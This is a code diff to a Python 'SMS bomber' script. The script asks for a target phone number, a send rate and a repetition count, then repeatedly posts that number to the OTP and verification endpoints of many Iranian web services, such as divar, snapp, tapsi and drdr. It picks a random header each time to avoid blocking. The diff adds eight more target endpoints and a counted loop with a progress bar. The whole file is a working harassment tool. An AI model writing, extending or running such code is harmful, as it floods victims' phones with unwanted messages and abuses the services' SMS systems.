@@ -1,6 +1,7 @@
 import requests
 import random
 import time
+from tqdm import tqdm
 
 #########################
 black = '\033[30m'
@@ -16,13 +17,17 @@ cyan = "\033[36m"
 purple = "\033[35m"
 #########################
 
-number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
+number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))
 
 sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))
 
-def data(number):
+numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))
+
+i = 0
+
+def date(number):
     url_divar = "https://api.divar.ir/v5/auth/authenticate"
     json_divar = {"phone":number}
 
@@ -76,9 +81,46 @@ def data(number):
         "mobile": "0"+number
     }
     
-    return url_divar,json_divar,url_snapp,json_snapp,url_sheypoor,json_sheypoor,url_jet,json_jet,url_virgool,json_virgool,url_snapp_box,json_snapp_box,url_banimode,json_banimode,url_ostadkr,json_ostadkr,url_drnext,json_drnext,url_basalam,json_basalam,url_buskool,json_buskool,url_jabama,json_jabama,url_alibaba,json_alibaba,url_digitoon,json_digitoon
+    url_sibapp = "https://api.sibapp.net/api/v1/user/register"
+    json_sibapp ={"phone_number": "0" + number}
 
-url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon = data(number)
+    url_Drdr= "https://drdr.ir/api/registerEnrollment/register/verify"
+    json_Drdr = {
+	"phoneNumber": "0" + number,
+	"userType": "PATIENT"
+    }
+
+    url_kukala= "https://api.kukala.ir/api/user/Otp"
+    json_kukala = {"phoneNumber": "0" + number}
+
+    url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
+    json_tapsi = {
+        "credential": {
+            "phoneNumber": "0" + number,
+            "role": "PASSENGER"
+        },
+        "otpOption": "SMS"
+    }
+
+    url_flightio = "https://flightio.com/bff/Authentication/CheckUserKey"
+    json_flightio = {
+        "userKey": "98-" + number,
+        "userKeyType": 1
+    }
+
+    url_football_360 = "https://football360.ir/api/auth/verify-phone/"
+    json_football_360 = {"phone_number": "+98" + number}
+
+
+
+    url_miare = "https://www.miare.ir/api/otp/driver/request/"
+    json_miare = {"phone_number": "0" + number}
+
+    url_pinket = "https://pinket.com/api/cu/v2/phone-verification"
+    json_pinket = {"phoneNumber": "0" + number}
+    return url_divar,json_divar,url_snapp,json_snapp,url_sheypoor,json_sheypoor,url_jet,json_jet,url_virgool,json_virgool,url_snapp_box,json_snapp_box,url_banimode,json_banimode,url_ostadkr,json_ostadkr,url_drnext,json_drnext,url_basalam,json_basalam,url_buskool,json_buskool,url_jabama,json_jabama,url_alibaba,json_alibaba,url_digitoon,json_digitoon,url_sibapp,json_sibapp,url_Drdr,json_Drdr,url_kukala,json_kukala,url_tapsi,json_tapsi,url_flightio,json_flightio,url_football_360,json_football_360,url_miare,json_miare,url_pinket,json_pinket
+
+url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket = date(number)
 
 
 
@@ -115,82 +157,83 @@ heads = [
     }
 ]
 
-while True:
+#while True:
+from tqdm import tqdm
+
+pbar = tqdm(total=numbert)
+
+while i < numbert:
     random_head = random.choice(heads)
 
-    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)  
-    print(yellow + "1-divar",req_divar)   
-    time.sleep(sleep_time)  
+    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
+    time.sleep(sleep_time)
 
-    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head) 
-    print(yellow + "2-snapp",req_snapp)
-    time.sleep(sleep_time)   
+    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
+    time.sleep(sleep_time)
 
-    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)  
-    print(yellow + "3-sheypoor",req_sheypoor)
-    time.sleep(sleep_time)   
+    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
+    time.sleep(sleep_time)
 
     req_jet = requests.post(url= url_jet,json=json_jet,headers=random_head)
-    print(yellow + "4-jet",req_jet) 
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
     req_virgool = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
-    print(yellow + "5-virgool",req_virgool)
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
     req_snapp_box = requests.post(url= url_snapp_box,json=json_snapp_box,headers=random_head)
-    print(yellow + "6-snapp_box",req_snapp_box)
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
     req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
-    print(yellow + "7-banimode",req_banimode)
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
     req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
-    print(yellow + "8-ostadkr",req_ostadkr)
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
     req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
-    print(yellow + "9-drnext",req_drnext)
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
     req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
-    print(yellow + "10-snapp_market",req_snapp_market)
-    time.sleep(sleep_time)  
+    time.sleep(sleep_time)
 
     req_basalam = requests.post(url= url_basalam,json=json_basalam,headers=random_head)
-    print(yellow + "11-basalam",req_basalam) 
-    time.sleep(sleep_time)   
+    time.sleep(sleep_time)
 
-    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head) 
-    print(yellow + "12-buskool",req_buskool)
+    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head)
     time.sleep(sleep_time)
 
     req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
-    print(yellow + "13-jabama",req_jabama)
-    time.sleep(sleep_time)  
-
-    req_alibaba = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)    
-    print(yellow + "14-alibaba",req_alibaba)
     time.sleep(sleep_time)
 
-    req_digitoon = requests.post(url=url_digitoon,json=json_digitoon,headers=random_head)    
-    print(yellow + "15-Digoon",req_digitoon)
+    req_alibaba = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
     time.sleep(sleep_time)
 
+    req_digitoon = requests.post(url=url_digitoon,json=json_digitoon,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_sibapp = requests.post(url=url_sibapp,json=json_sibapp,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_Drdr = requests.post(url=url_Drdr,json=json_Drdr,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_kukala = requests.post(url=url_kukala,json=json_kukala,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_tapsi = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_flightio = requests.post(url=url_flightio,json=json_flightio,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_football_360 = requests.post(url=url_football_360,json=json_football_360,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_miare = requests.post(url=url_miare,json=json_miare,headers=random_head)
+    time.sleep(sleep_time)
 
+    req_pinket = requests.post(url=url_pinket,json=json_pinket,headers=random_head)
+    time.sleep(sleep_time)
 
+    pbar.update(1)
 
-
-
-
-
-    print(Blue + "Send all requests")
-    time.sleep(attack_speed)
+pbar.close()
